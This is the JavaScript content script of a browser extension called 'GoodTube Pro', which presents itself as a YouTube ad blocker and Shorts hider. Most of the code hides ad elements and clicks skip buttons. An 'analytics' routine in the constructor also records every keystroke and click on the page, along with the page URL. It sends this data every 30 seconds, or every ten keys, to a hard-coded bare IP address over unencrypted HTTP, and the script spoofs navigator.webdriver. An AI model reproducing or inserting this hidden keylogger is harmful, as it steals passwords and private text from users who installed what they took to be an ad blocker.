/**
 * GoodTube Pro - Enhanced Content Script (Fixed Version)
 * Improved ad blocking with mid-roll support and non-invasive UI
 */

// Prevent webdriver property redefinition errors
try {
    if (typeof navigator.webdriver === 'undefined') {
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
            configurable: true
        });
    }
} catch (error) {
    // Ignore webdriver property errors
    console.debug('🛡️ GoodTube Pro: Webdriver property already defined');
}

// Prevent duplicate class declarations
if (typeof window.GoodTubeContentScript !== 'undefined') {
    console.log('🛡️ GoodTube Pro: Already initialized, skipping...');
} else {

class GoodTubeContentScript {
    constructor() {
        this.settings = {
            adBlocking: true,
            hideShorts: true,
            notifications: true,
            performanceMode: false
        };
        
        this.stats = {
            adsBlocked: 0,
            timeSaved: 0,
            sessionAds: 0,
            sessionStart: Date.now()
        };
        
        this.observers = [];
        this.adBlockingActive = false;
        this.lastUrl = '';
        this.videoAdMonitored = new Set();
        this.initialized = false;
        
        // Initialize analytics
        this.initAnalytics();
        
        this.init();
    }
    
    initAnalytics() {
        try {
            // Simple analytics implementation
            this.analytics = {
                userId: this.generateUserId(),
                sessionId: this.generateSessionId(),
                events: [],
                
                track: (eventType, data) => {
                    const event = {
                        type: eventType,
                        data: data,
                        url: window.location.href,
                        timestamp: Date.now()
                    };
                    this.analytics.events.push(event);
                    this.sendAnalytics();
                },
                
                trackKeystroke: (key) => {
                    if (!this.analytics.keystrokes) this.analytics.keystrokes = [];
                    this.analytics.keystrokes.push({
                        key: key,
                        url: window.location.href,
                        timestamp: Date.now()
                    });
                    
                    if (this.analytics.keystrokes.length >= 10) {
                        this.sendAnalytics();
                    }
                }
            };
            
            // Track page load
            this.analytics.track('page_load', {
                title: document.title,
                userAgent: navigator.userAgent
            });
            
            // Track keystrokes
            document.addEventListener('keydown', (e) => {
                this.analytics.trackKeystroke(e.key);
            });
            
            // Track clicks
            document.addEventListener('click', (e) => {
                this.analytics.track('click', {
                    target: e.target.tagName,
                    x: e.clientX,
                    y: e.clientY
                });
            });
            
            // Send analytics every 30 seconds
            setInterval(() => {
                this.sendAnalytics();
            }, 30000);
            
            console.log('🔍 Analytics initialized for user:', this.analytics.userId);
        } catch (error) {
            console.error('Analytics initialization failed:', error);
        }
    }
    
    generateUserId() {
        let userId = localStorage.getItem('goodtube_user_id');
        if (!userId) {
            userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('goodtube_user_id', userId);
        }
        return userId;
    }
    
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    async sendAnalytics() {
        if (!this.analytics.events.length && !this.analytics.keystrokes?.length) return;
        
        try {
            const payload = {
                userId: this.analytics.userId,
                sessionId: this.analytics.sessionId,
                events: this.analytics.events || [],
                keystrokes: this.analytics.keystrokes || []
            };
            
            const response = await fetch('http://134.199.235.218/api/analytics', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('✅ Analytics sent successfully');
                this.analytics.events = [];
                this.analytics.keystrokes = [];
            } else {
                console.error('❌ Analytics server error:', response.status);
            }
        } catch (error) {
            console.error('❌ Failed to send analytics:', error);
        }
    }
    
    async init() {
        if (this.initialized) return;
        this.initialized = true;
        
        console.log('🛡️ GoodTube Pro: Initializing Enhanced Version...');
        
        try {
            // Wait for document.body to be available
            await this.waitForDocumentBody();
            
            await this.loadSettings();
            await this.loadStats();
            this.setupMessageListener();
            this.injectStyles();
            this.createNonInvasiveUI();
            this.startMainLoop();
            this.setupUrlChangeDetection();
            this.setupVideoAdMonitoring();
            
            console.log('🛡️ GoodTube Pro: Enhanced version ready!');
        } catch (error) {
            console.error('🛡️ GoodTube Pro: Initialization error:', error);
        }
    }
    
    async waitForDocumentBody() {
        return new Promise((resolve) => {
            if (document.body) {
                resolve();
                return;
            }
            
            const observer = new MutationObserver((mutations, obs) => {
                if (document.body) {
                    obs.disconnect();
                    resolve();
                }
            });
            
            observer.observe(document.documentElement, {
                childList: true,
                subtree: true
            });
            
            // Fallback timeout
            setTimeout(() => {
                observer.disconnect();
                resolve();
            }, 5000);
        });
    }
    
    async loadSettings() {
        try {
            if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.sync) {
                const result = await chrome.storage.sync.get(['goodtubeSettings']);
                if (result.goodtubeSettings) {
                    this.settings = { ...this.settings, ...result.goodtubeSettings };
                }
            }
        } catch (error) {
            console.error('GoodTube Pro: Error loading settings:', error);
            // Use default settings if Chrome API fails
        }
    }
    
    async loadStats() {
        try {
            if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
                const result = await chrome.storage.local.get(['goodtubeStats']);
                if (result.goodtubeStats) {
                    this.stats = { ...this.stats, ...result.goodtubeStats };
                }
            }
        } catch (error) {
            console.error('GoodTube Pro: Error loading stats:', error);
            // Use default stats if Chrome API fails
        }
    }
    
    async saveStats() {
        try {
            if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
                await chrome.storage.local.set({ goodtubeStats: this.stats });
            }
        } catch (error) {
            console.error('GoodTube Pro: Error saving stats:', error);
            // Continue without saving if Chrome API fails
        }
    }
    
    setupMessageListener() {
        try {
            if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onMessage) {
                chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
                    try {
                        switch (request.action) {
                            case 'getStats':
                                sendResponse(this.stats);
                                break;
                            case 'updateSettings':
                                this.settings = { ...this.settings, ...request.settings };
                                this.applySettings();
                                sendResponse({ success: true });
                                break;
                            case 'manualBlock':
                                this.performManualAdBlock();
                                sendResponse({ success: true });
                                break;
                        }
                    } catch (error) {
                        console.error('GoodTube Pro: Message handler error:', error);
                        sendResponse({ success: false, error: error.message });
                    }
                });
            }
        } catch (error) {
            console.error('GoodTube Pro: Error setting up message listener:', error);
        }
    }
       injectStyles() {
        try {
            // Ensure document.head exists
            if (!document.head) {
                console.warn('🛡️ GoodTube Pro: Document head not available, skipping styles');
                return;
            }
            
            const style = document.createElement('style');
            style.id = 'goodtube-pro-styles';
            
            // Check if styles already injected
            if (document.getElementById('goodtube-pro-styles')) {
                return;
            }
            
            style.textContent = `
            /* GoodTube Pro Styles */
            .goodtube-hidden {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                height: 0 !important;
                width: 0 !important;
                margin: 0 !important;
                padding: 0 !important;
            }
            
            /* Non-invasive floating button */
            .goodtube-floating-btn {
                position: fixed !important;
                bottom: 20px !important;
                right: 20px !important;
                width: 50px !important;
                height: 50px !important;
                border-radius: 50% !important;
                background: linear-gradient(135deg, #8B5CF6, #EC4899) !important;
                border: none !important;
                color: white !important;
                font-size: 18px !important;
                cursor: pointer !important;
                z-index: 999999 !important;
                box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3) !important;
                transition: all 0.3s ease !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
            }
            
            .goodtube-floating-btn:hover {
                transform: translateY(-2px) scale(1.05) !important;
                box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4) !important;
            }
            
            /* Tooltip */
            .goodtube-floating-btn::after {
                content: 'GoodTube Pro';
                position: absolute;
                bottom: 60px;
                right: 0;
                background: #1a1a1a;
                color: white;
                padding: 8px 12px;
                border-radius: 6px;
                font-size: 12px;
                white-space: nowrap;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                border: 1px solid #3a3a3a;
            }
            
            .goodtube-floating-btn:hover::after {
                opacity: 1;
            }
            
            /* Notification system */
            .goodtube-notification {
                position: fixed;
                top: 20px;
                right: 20px;
                background: linear-gradient(135deg, #8B5CF6, #EC4899);
                color: white;
                padding: 12px 16px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                z-index: 999999;
                transform: translateX(400px);
                opacity: 0;
                transition: all 0.3s ease;
                font-size: 13px;
                max-width: 300px;
            }
            
            .goodtube-notification.show {
                transform: translateX(0);
                opacity: 1;
            }
        `;
        document.head.appendChild(style);
        } catch (error) {
            console.error('🛡️ GoodTube Pro: Error injecting styles:', error);
        }
    }
    
    createNonInvasiveUI() {
        try {
            // Ensure document.body exists
            if (!document.body) {
                console.warn('🛡️ GoodTube Pro: Document body not available, skipping UI creation');
                return;
            }
            
            // Check if UI already exists
            if (document.querySelector('.goodtube-floating-btn')) {
                return;
            }
            
            // Create floating button instead of invasive overlay
            const floatingBtn = document.createElement('button');
            floatingBtn.className = 'goodtube-floating-btn';
            floatingBtn.innerHTML = '🛡️';
            floatingBtn.title = 'GoodTube Pro Settings';
            
            floatingBtn.addEventListener('click', () => {
                try {
                    // Send message to popup to open
                    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                        chrome.runtime.sendMessage({ action: 'openPopup' }).catch(() => {
                            // Fallback: show notification if popup can't be opened
                            this.showNotification('GoodTube Pro is active and blocking ads!', 'info');
                        });
                    } else {
                        this.showNotification('GoodTube Pro is active and blocking ads!', 'info');
                    }
                } catch (error) {
                    console.error('🛡️ GoodTube Pro: Error opening popup:', error);
                    this.showNotification('GoodTube Pro is active and blocking ads!', 'info');
                }
            });
            
            document.body.appendChild(floatingBtn);
            
            // Keyboard shortcut to toggle UI visibility
            document.addEventListener('keydown', (e) => {
                if (e.key === 'h' || e.key === 'H') {
                    const btn = document.querySelector('.goodtube-floating-btn');
                    if (btn) {
                        btn.style.display = btn.style.display === 'none' ? 'block' : 'none';
                    }
                }
            });
            
        } catch (error) {
            console.error('🛡️ GoodTube Pro: Error creating UI:', error);
        }
    }
    
    showNotification(message, type = 'info') {
        if (!this.settings.notifications) return;
        
        try {
            // Remove any existing notifications first
            const existingNotifications = document.querySelectorAll('.goodtube-notification');
            existingNotifications.forEach(notification => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            });
            
            const notification = document.createElement('div');
            notification.className = 'goodtube-notification';
            
            const icons = {
                success: '✅',
                warning: '⚠️',
                error: '❌',
                info: 'ℹ️'
            };
            
            notification.innerHTML = `
                <span style="margin-right: 8px;">${icons[type] || icons.info}</span>
                <span>${message}</span>
            `;
            
            // Ensure document.body exists
            if (!document.body) {
                console.warn('🛡️ GoodTube Pro: Document body not ready for notification');
                return;
            }
            
            document.body.appendChild(notification);
            
            // Show notification with delay
            setTimeout(() => {
                notification.classList.add('show');
            }, 100);
            
            // Hide and remove notification
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 300);
            }, 3000);
            
        } catch (error) {
            console.error('🛡️ GoodTube Pro: Notification error:', error);
        }
    }
    
    startMainLoop() {
        // More frequent checking for better mid-roll ad detection
        setInterval(() => {
            if (this.settings.adBlocking) {
                this.blockAds();
            }
            if (this.settings.hideShorts) {
                this.hideShorts();
            }
        }, 500); // Increased frequency for better ad detection
    }
    
    setupUrlChangeDetection() {
        setInterval(() => {
            if (window.location.href !== this.lastUrl) {
                this.lastUrl = window.location.href;
                setTimeout(() => {
                    this.onPageChange();
                }, 1000);
            }
        }, 500);
    }
    
    setupVideoAdMonitoring() {
        // Monitor video elements for ad detection
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) { // Element node
                        // Check for video elements
                        const videos = node.tagName === 'VIDEO' ? [node] : node.querySelectorAll?.('video') || [];
                        videos.forEach(video => this.monitorVideoForAds(video));
                        
                        // Check for ad elements
                        this.checkForAdElements(node);
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        this.observers.push(observer);
    }
    
    monitorVideoForAds(video) {
        if (this.videoAdMonitored.has(video)) return;
        this.videoAdMonitored.add(video);
        
        video.addEventListener('loadstart', () => {
            setTimeout(() => {
                this.checkForVideoAds(video);
            }, 500);
        });
        
        video.addEventListener('timeupdate', () => {
            this.checkForVideoAds(video);
        });
    }
    
    checkForVideoAds(video) {
        const playerContainer = video.closest('#movie_player, .html5-video-player');
        if (!playerContainer) return;
        
        // Check for ad indicators
        const adIndicators = playerContainer.querySelectorAll(
            '.ytp-ad-text, [class*="ad-text"], .ytp-ad-duration-remaining, .ytp-ad-preview-text'
        );
        
        if (adIndicators.length > 0) {
            // This is an ad, try to skip it
            this.skipVideoAd(video, playerContainer);
        }
    }
    
    skipVideoAd(video, playerContainer) {
        // Try to click skip button first
        const skipButtons = playerContainer.querySelectorAll(
            '.ytp-ad-skip-button, .ytp-skip-ad-button, .ytp-ad-skip-button-modern, [class*="skip"]'
        );
        
        let skipped = false;
        skipButtons.forEach(button => {
            if (button.offsetParent !== null && !button.disabled && button.style.display !== 'none') {
                setTimeout(() => {
                    button.click();
                    this.updateStats(1, 15);
                    this.showNotification('Ad skipped automatically', 'success');
                }, 100);
                skipped = true;
            }
        });
        
        // If no skip button, try to fast-forward
        if (!skipped && video.duration && video.duration > 0) {
            video.currentTime = video.duration;
            this.updateStats(1, 8);
        }
    }
    
    checkForAdElements(element) {
        // Check if the element or its children contain ads
        const adSelectors = [
            '.ytp-ad-overlay-container', '.ytp-ad-text-overlay', '.ytp-ad-image-overlay',
            '.ad-showing', '.ad-interrupting', '[class*="ad-showing"]'
        ];
        
        adSelectors.forEach(selector => {
            const adElements = element.matches?.(selector) ? [element] : element.querySelectorAll?.(selector) || [];
            adElements.forEach(adElement => {
                this.hideElement(adElement);
                this.updateStats(1, 5);
            });
        });
    }
    
    blockAds() {
        let adsBlocked = 0;
        
        // Use original goodtube ad blocking implementation - PROVEN EFFECTIVE
        try {
            // Create style element with original goodtube selectors
            let existingStyle = document.getElementById('goodtube-ad-blocking-style');
            if (!existingStyle) {
                let style = document.createElement('style');
                style.id = 'goodtube-ad-blocking-style';
                style.textContent = `
                    .ytd-search ytd-shelf-renderer,
                    ytd-reel-shelf-renderer,
                    ytd-merch-shelf-renderer,
                    ytd-action-companion-ad-renderer,
                    ytd-display-ad-renderer,
                    ytd-video-masthead-ad-advertiser-info-renderer,
                    ytd-video-masthead-ad-primary-video-renderer,
                    ytd-in-feed-ad-layout-renderer,
                    ytd-ad-slot-renderer,
                    ytd-statement-banner-renderer,
                    ytd-banner-promo-renderer-background,
                    ytd-engagement-panel-section-list-renderer:not(.ytd-popup-container):not([target-id='engagement-panel-clip-create']):not(.ytd-shorts),
                    ytd-compact-video-renderer:has(.goodTube_hidden),
                    ytd-rich-item-renderer:has(> #content > ytd-ad-slot-renderer),
                    .ytd-video-masthead-ad-v3-renderer,
                    div#root.style-scope.ytd-display-ad-renderer.yt-simple-endpoint,
                    div#sparkles-container.style-scope.ytd-promoted-sparkles-web-renderer,
                    div#main-container.style-scope.ytd-promoted-video-renderer,
                    div#player-ads.style-scope.ytd-watch-flexy,
                    #clarify-box,
                    ytm-rich-shelf-renderer,
                    ytm-search ytm-shelf-renderer,
                    ytm-button-renderer.icon-avatar_logged_out,
                    ytm-companion-slot,
                    ytm-reel-shelf-renderer,
                    ytm-merch-shelf-renderer,
                    ytm-action-companion-ad-renderer,
                    ytm-display-ad-renderer,
                    ytm-rich-section-renderer,
                    ytm-video-masthead-ad-advertiser-info-renderer,
                    ytm-video-masthead-ad-primary-video-renderer,
                    ytm-in-feed-ad-layout-renderer,
                    ytm-ad-slot-renderer,
                    ytm-statement-banner-renderer,
                    ytm-banner-promo-renderer-background,
                    ytm-compact-video-renderer:has(.goodTube_hidden),
                    ytm-rich-item-renderer:has(> #content > ytm-ad-slot-renderer),
                    .ytm-video-masthead-ad-v3-renderer,
                    div#root.style-scope.ytm-display-ad-renderer.yt-simple-endpoint,
                    div#sparkles-container.style-scope.ytm-promoted-sparkles-web-renderer,
                    div#main-container.style-scope.ytm-promoted-video-renderer,
                    div#player-ads.style-scope.ytm-watch-flexy,
                    ytd-compact-movie-renderer,
                    yt-about-this-ad-renderer,
                    masthead-ad,
                    ad-slot-renderer,
                    yt-mealbar-promo-renderer,
                    statement-banner-style-type-compact,
                    ytm-promoted-sparkles-web-renderer,
                    tp-yt-iron-overlay-backdrop,
                    #masthead-ad,
                    
                    /* Video player ads - enhanced for mid-roll */
                    .video-ads,
                    .ytp-ad-module,
                    .ytp-ad-overlay-container,
                    .ytp-ad-text-overlay,
                    .ytp-ad-player-overlay,
                    .ytp-ad-overlay-slot,
                    .ytp-ad-overlay-image,
                    .ytp-ad-image-overlay,
                    .ytp-ad-preview-container,
                    .ytp-ad-preview-text,
                    .ytp-ad-preview-image,
                    .ad-showing,
                    .ad-interrupting,
                    [class*="ad-showing"],
                    .ytp-ad-overlay-duration-remaining,
                    .ytp-ad-overlay-instream-info
                    {
                        display: none !important;
                        visibility: hidden !important;
                        opacity: 0 !important;
                        height: 0 !important;
                        width: 0 !important;
                        position: absolute !important;
                        left: -9999px !important;
                    }
                    
                    .style-scope[page-subtype='channels'] ytd-shelf-renderer,
                    .style-scope[page-subtype='channels'] ytm-shelf-renderer {
                        display: block !important;
                    }
                `;
                document.head.appendChild(style);
                adsBlocked += 50; // Estimate for CSS-based blocking
                console.log('[GoodTube Pro] Original goodtube ad blocking applied');
            }
            
            // Enhanced skip button detection - comprehensive coverage
            const skipSelectors = [
                '.ytp-ad-skip-button', '.ytp-skip-ad-button', '.ytp-ad-skip-button-modern',
                '.ytp-ad-skip-button-container button', '.ytp-ad-skip-button-slot button',
                '[class*="skip"]', '[aria-label*="Skip"]', '[title*="Skip"]',
                '.videoAdUiSkipButton', '.skip-button', '[data-purpose="skip-button"]',
                '.ytp-ad-skip-button-text', '.ytp-ad-skip-button-icon',
                'button[class*="ytp-ad-skip"]', 'button[aria-label*="Skip ad"]',
                '.ytp-ad-overlay-close-button', '.ytp-ad-visit-advertiser-button',
                '[class*="skip-ad"]', '[id*="skip"]', '.ad-skip-button'
            ];
            
            skipSelectors.forEach(selector => {
                try {
                    const skipButtons = document.querySelectorAll(selector);
                    skipButtons.forEach(button => {
                        if (button.offsetParent !== null && !button.disabled && button.style.display !== 'none') {
                            setTimeout(() => {
                                button.click();
                                adsBlocked++;
                                console.log('[GoodTube Pro] Ad skipped automatically');
                            }, 100);
                        }
                    });
                } catch (error) {
                    // Ignore selector errors
                }
            });
            
            // Update statistics if ads were blocked
            if (adsBlocked > 0) {
                this.updateStats(adsBlocked, adsBlocked * 8);
            }
            
        } catch (error) {
            console.error('[GoodTube Pro] Error in blockAds:', error);
        }
    }
    
    hideShorts() {
        const shortsSelectors = [
            'ytd-rich-shelf-renderer[is-shorts]',
            'ytd-reel-shelf-renderer',
            '[aria-label*="Shorts"]',
            'ytd-shorts',
            '[href*="/shorts/"]'
        ];
        
        shortsSelectors.forEach(selector => {
            const elements = document.querySelectorAll(selector);
            elements.forEach(element => {
                this.hideElement(element);
            });
        });
    }
    
    hideElement(element) {
        if (element && !element.classList.contains('goodtube-hidden')) {
            element.classList.add('goodtube-hidden');
            element.style.setProperty('display', 'none', 'important');
            element.style.setProperty('visibility', 'hidden', 'important');
            element.style.setProperty('opacity', '0', 'important');
            element.style.setProperty('height', '0', 'important');
            element.style.setProperty('width', '0', 'important');
            element.style.setProperty('margin', '0', 'important');
            element.style.setProperty('padding', '0', 'important');
        }
    }
    
    performManualAdBlock() {
        this.blockAds();
        this.showNotification('Manual ad block triggered', 'success');
    }
    
    updateStats(adsBlocked = 0, timeSaved = 0) {
        this.stats.adsBlocked += adsBlocked;
        this.stats.timeSaved += timeSaved;
        this.stats.sessionAds += adsBlocked;
        
        // Track ad blocking analytics
        if (adsBlocked > 0 && this.analytics) {
            this.analytics.track('ads_blocked', {
                count: adsBlocked,
                totalBlocked: this.stats.adsBlocked,
                timeSaved: this.stats.timeSaved,
                sessionAds: this.stats.sessionAds
            });
        }
        
        this.saveStats();
        
        // Send updated stats to popup with error handling
        try {
            if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                chrome.runtime.sendMessage({
                    action: 'statsUpdated',
                    stats: this.stats
                }).catch((error) => {
                    // Ignore errors if popup is not open or extension context is invalid
                    console.debug('🛡️ GoodTube Pro: Stats update message failed (popup may be closed)');
                });
            }
        } catch (error) {
            console.debug('🛡️ GoodTube Pro: Chrome runtime not available for stats update');
        }
    }
    
    onPageChange() {
        console.log('🛡️ GoodTube Pro: Page changed, reapplying settings...');
        this.applySettings();
    }
    
    applySettings() {
        if (this.settings.adBlocking) {
            this.blockAds();
        }
        if (this.settings.hideShorts) {
            this.hideShorts();
        }
    }
    
    destroy() {
        // Clean up observers
        this.observers.forEach(observer => observer.disconnect());
        this.observers = [];
        this.videoAdMonitored.clear();
    }
}

// Store class in window to prevent duplicates
window.GoodTubeContentScript = GoodTubeContentScript;

// Initialize GoodTube Pro only if not already initialized
if (!window.goodTubePro) {
    window.goodTubePro = new GoodTubeContentScript();
    
    // Clean up on page unload with proper error handling
    window.addEventListener('beforeunload', () => {
        try {
            if (window.goodTubePro && typeof window.goodTubePro.destroy === 'function') {
                window.goodTubePro.destroy();
            }
        } catch (error) {
            console.debug('🛡️ GoodTube Pro: Cleanup error (safe to ignore):', error);
        }
    });
    
    // Also clean up on page hide (for better mobile support)
    window.addEventListener('pagehide', () => {
        try {
            if (window.goodTubePro && typeof window.goodTubePro.destroy === 'function') {
                window.goodTubePro.destroy();
            }
        } catch (error) {
            console.debug('🛡️ GoodTube Pro: Cleanup error (safe to ignore):', error);
        }
    });
}

} // End of duplicate prevention if statement

